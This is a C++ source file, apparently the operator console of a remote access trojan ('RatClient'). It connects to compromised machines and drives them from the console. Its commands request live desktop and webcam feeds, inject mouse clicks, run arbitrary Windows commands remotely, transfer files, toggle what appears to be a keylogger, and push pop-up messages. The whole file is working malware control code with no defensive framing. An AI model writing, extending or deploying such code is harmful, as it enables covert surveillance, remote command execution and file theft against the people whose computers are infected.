// RatClient.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "../WinNetlib/Multi/Multi_NetworkHandlerClient.h"

#include <string>
#include <thread>

#include <opencv2/opencv.hpp>

using namespace std;

std::wstring s2ws(const std::string& s)
{
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}

HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
Multi_NetworkHandlerClient NH;
string DesktopFeed = "Desktop Feed";
string CamFeed = "Cam Feed";

NamedSOCKET * SelectedServer;

void CallBackFunc(int event, int x, int y, int flags, void* userdata)
{
    if (event == cv::EVENT_LBUTTONDOWN)
    {
        NH.SendDataType("MouseDown",SelectedServer);
        NH.SendDataT<int>(1, SelectedServer);
    }
    else if (event == cv::EVENT_RBUTTONDOWN)
    {
        NH.SendDataType("MouseDown", SelectedServer);
        NH.SendDataT<int>(2, SelectedServer);
    }
    else if (event == cv::EVENT_MBUTTONDOWN)
    {
        NH.SendDataType("MouseDown", SelectedServer);
        NH.SendDataT<int>(3, SelectedServer);
    }
    else if (event == cv::EVENT_LBUTTONUP)
    {
        NH.SendDataType("MouseUp", SelectedServer);
        NH.SendDataT<int>(1, SelectedServer);
    }
    else if (event == cv::EVENT_RBUTTONUP)
    {
    NH.SendDataType("MouseUp", SelectedServer);
        NH.SendDataT<int>(2, SelectedServer);
    }
    else if (event == cv::EVENT_MBUTTONUP)
    {
        NH.SendDataType("MouseUp", SelectedServer);
        NH.SendDataT<int>(3, SelectedServer);
    }
    else if (event == cv::EVENT_MOUSEMOVE)
    {

    }
}

void rcv(NamedSOCKET * ns) {
    DataType dt;
    cv::Mat Dimage;
    cv::Mat Cimage;
    INPUT in;

    NH.SendTypeList(ns);

    while (ns->connected) {
        NH.RecvDataType(&dt, ns);
        if (dt.Name == "SendFILE") {
            std::string path;
            NH.RecvDataT<std::string>(&path, ns);
            NH.RecvFile(path, ns);
        }
        else if (dt.Name == "DesktopIMG")
        {
                NH.RecvCVMat(&Dimage, ns);
                cv::imshow(DesktopFeed, Dimage); // Show our image inside the created window                
        }
        else if (dt.Name == "CamIMG") {
                NH.RecvCVMat(&Cimage, ns);
                cv::imshow(CamFeed, Cimage); // Show our image inside the created window.
        }
        else if (dt.Name == "MBAwnser") {
            int awnser;

            NH.RecvDataT<int>(&awnser, ns);

            if (awnser == 1) {
                printf("\r%c[2K", 27);
                printf("Answer is yes.\n");
                SetConsoleTextAttribute(hConsole, 10);
                printf("Enter command: ");
                SetConsoleTextAttribute(hConsole, 7);
            }
            else {
                printf("\r%c[2K", 27);
                printf("Answer is no.\n");
                SetConsoleTextAttribute(hConsole, 10);
                printf("Enter command: ");
                SetConsoleTextAttribute(hConsole, 7);
            }
        }
        else if (dt.Name == "ConsoleMessage") {
            system("cls");
            string s;
            NH.RecvDataT<string>(&s, ns);
            SetConsoleTextAttribute(hConsole, 14);
            printf(s.c_str());
            printf("\n");
            SetConsoleTextAttribute(hConsole, 7);
        }
        else {
            //printf("invalid packet type");
        }

    }
}


void DesktopFeedLoop(NamedSOCKET*ns) {
    cv::namedWindow(DesktopFeed, cv::WINDOW_NORMAL);
    cv::resizeWindow(DesktopFeed, 960, 540);
    cv::setMouseCallback(DesktopFeed, CallBackFunc, NULL);
    while (true) {
        NH.SendDataType("DesktopIMG", ns);
        if (cv::waitKey(1) == 27) {
            break;
        }
        else{
            //send key press to server
            //NH.SendDataType("KeyDown");
        }
        Sleep(500);
    }
    cv::destroyWindow(DesktopFeed);
    Sleep(1500);
    cv::destroyWindow(DesktopFeed);
}

void CamFeedLoop(NamedSOCKET * ns) {
    cv::namedWindow(CamFeed, cv::WINDOW_NORMAL);
    cv::resizeWindow(CamFeed, 500, 500);

    while (cv::getWindowProperty(CamFeed, cv::WND_PROP_VISIBLE)>0) {
        printf("%f", cv::getWindowProperty(CamFeed, cv::WND_PROP_VISIBLE));
        NH.SendDataType("CamIMG", ns);
        if (cv::waitKey(1) == 27) {
            break;
        }
        Sleep(500);
    }
    cv::destroyWindow(CamFeed);
    Sleep(1500);
    cv::destroyWindow(CamFeed);
}

int main()
{
    NH.AddDataType("DesktopIMG", 2);
    NH.AddDataType("MousePos", 3);
    NH.AddDataType("MouseDown", 4);
    NH.AddDataType("MouseUp", 5);
    NH.AddDataType("KeyDown", 6);
    NH.AddDataType("KeyUp", 7);
    NH.AddDataType("CamIMG", 8);
    NH.AddDataType("SendFILE", 9);
    NH.AddDataType("RecvFILE", 10);
    NH.AddDataType("CMD", 11);
    NH.AddDataType("EnableLogger", 12);
    NH.AddDataType("DisableLogger", 13);
    NH.AddDataType("RecvPopUp", 14);
    NH.AddDataType("RecvPopUpYN", 15);
    NH.AddDataType("ConsoleMessage", 16);
    NH.AddDataType("MBAwnser", 17);
    NH.AddDataType("Disconnect", 18);
    //NH.AddDataType("", 3);

    thread recvThread;
    thread DesktopThread;
    thread CamThread;
    string input = "";

    NH.SetName("client");
    NH.RecvFunct = &rcv;

    while (true)
    {
        if (SelectedServer != nullptr) {
            SetConsoleTextAttribute(hConsole, 12);
            printf("Selected Server IP: ");
            SetConsoleTextAttribute(hConsole, 7);
            printf("%s", SelectedServer->IP.c_str());
            SetConsoleTextAttribute(hConsole, 12);
            printf(" Selected Server Port: ");
            SetConsoleTextAttribute(hConsole, 7);
            printf("%s", SelectedServer->PORT.c_str());
            printf("\n");
        }
        SetConsoleTextAttribute(hConsole, 10);
        printf("Enter command: ");
        SetConsoleTextAttribute(hConsole, 7);
        getline(cin, input);
        if (input == "Connect") {  
            string ip = "None";
            string port = "None";
            SetConsoleTextAttribute(hConsole, 12);
            printf("Enter IP Adress: ");
            SetConsoleTextAttribute(hConsole, 7);
            getline(cin, ip);
            SetConsoleTextAttribute(hConsole, 12);
            printf("Enter Port: ");
            SetConsoleTextAttribute(hConsole, 7);
            getline(cin, port);
            system("cls");
            if (NH.Connect((PCSTR)ip.c_str(), (PCSTR)port.c_str())) {
                SelectedServer = &NH.ConnectedSockets[NH.ConnectedSockets.size() - 1];
                NH.SendDataType(1, SelectedServer);
                NH.SendTypeList(SelectedServer);
            }
            else {
                ip = "None";
                port = "None";
                SetConsoleTextAttribute(hConsole, 13);
                printf("failed to connect!\n");
                NH.DisConnect(SelectedServer);
            }
        }
        if (input == "DefaultConnect") {
            system("cls");
            if (NH.DefaultInitConnect()) {
                SelectedServer = &NH.ConnectedSockets[NH.ConnectedSockets.size()-1];
                NH.SendDataType(1, SelectedServer);
                NH.SendTypeList(SelectedServer);
            }
            else {
                SelectedServer = &NH.ConnectedSockets[NH.ConnectedSockets.size()-1];
                SetConsoleTextAttribute(hConsole, 13);
                printf("failed to connect!\n");
                NH.DisConnect(SelectedServer);
            }
            continue;
        }
        else if (input == "Disconnect") {
            NH.SendDataType("Disconnect", SelectedServer);
            NH.DisConnect(SelectedServer);
        }
        else if (input == "Help") {
            system("cls");
            SetConsoleTextAttribute(hConsole, 11);
            printf("Commands are: \n");
            printf("Connect \n");
            printf("DefaultConnect \n");
            printf("Disconnect \n");
            printf("Message \n");
            printf("MessageBox \n");
            printf("MessageBoxYN \n");
            printf("CMD \n");
            printf("DesktopFeed\n");
            printf("CamFeed\n");
            printf("ListServers\n");
            printf("SelectServer\n");
            continue;
        }
        else if (input == "Message") {
            SetConsoleTextAttribute(hConsole, 10);
            printf("Enter message: ");
            SetConsoleTextAttribute(hConsole, 7);
            getline(cin, input);
            NH.SendDataType("ConsoleMessage", SelectedServer);
            NH.SendDataT<string>(input, SelectedServer);
        }
        else if (input == "MessageBox") {
            NH.SendDataType("RecvPopUp", SelectedServer);

            string title;
            string msg;
            printf("Box Title: ");
            getline(cin, title);
            printf("Box Message: ");
            getline(cin, msg);

            NH.SendDataT<wstring>(s2ws(title+'\0'), SelectedServer);
            NH.SendDataT<wstring>(s2ws(msg + '\0'), SelectedServer);
            continue;
        }
        else if (input == "MessageBoxYN") {
            NH.SendDataType("RecvPopUpYN", SelectedServer);

            string title;
            string msg;
            printf("Box Title: ");
            getline(cin, title);
            printf("Box Message: ");
            getline(cin, msg);

            NH.SendDataT<wstring>(s2ws(title), SelectedServer);
            NH.SendDataT<wstring>(s2ws(msg), SelectedServer);
            continue;
        }
        else if (input == "CMD") {
            NH.SendDataType("CMD", SelectedServer);
            SetConsoleTextAttribute(hConsole, 10);
            printf("Enter windows command: ");
            SetConsoleTextAttribute(hConsole, 7);
            getline(cin, input);
            NH.SendDataT<string>(input, SelectedServer);
        }
        else if (input == "DesktopFeed") {
            DesktopThread = thread(DesktopFeedLoop, SelectedServer);
        }
        else if (input == "CamFeed") {
            CamThread = thread(CamFeedLoop,SelectedServer);
        }
        else if (input == "SelectServer") {
            SetConsoleTextAttribute(hConsole, 10);
            printf("How should we select (Name, IP): ");
            SetConsoleTextAttribute(hConsole, 7);
            getline(cin, input);
            if (input=="name") {
                SetConsoleTextAttribute(hConsole, 10);
                printf("Enter Server Name: ");
                SetConsoleTextAttribute(hConsole, 7);
                getline(cin, input);
                SelectedServer = NH.FindSocket(input,true);
            }
            else if (input == "IP") {
                SetConsoleTextAttribute(hConsole, 10);
                printf("Enter Server IP: ");
                SetConsoleTextAttribute(hConsole, 7);
                getline(cin, input);
                SelectedServer = NH.FindSocket(input,false);
            }
        }
        else if (input == "ListServers") {
            for (int i = 0; i < NH.ConnectedSockets.size(); i++)
            {
                SetConsoleTextAttribute(hConsole, 12);
                printf("Server Name: ");
                SetConsoleTextAttribute(hConsole, 11);
                printf(NH.ConnectedSockets[i].name.c_str());
                SetConsoleTextAttribute(hConsole, 12);
                printf(" Server Ip: ");
                SetConsoleTextAttribute(hConsole, 11);
                printf(NH.ConnectedSockets[i].IP.c_str());
                SetConsoleTextAttribute(hConsole, 12);
                printf(" Server Port: ");
                SetConsoleTextAttribute(hConsole, 11);
                printf(NH.ConnectedSockets[i].PORT.c_str());
                printf("\n");
                SetConsoleTextAttribute(hConsole, 7);
            }
            continue;
        }
        else {
            system("cls");
            printf("Invalid Command!\n");
            continue;
        }
        /*else if (input == "") {

        }*/
        system("cls");
    }
    system("pause");
    return 0;
}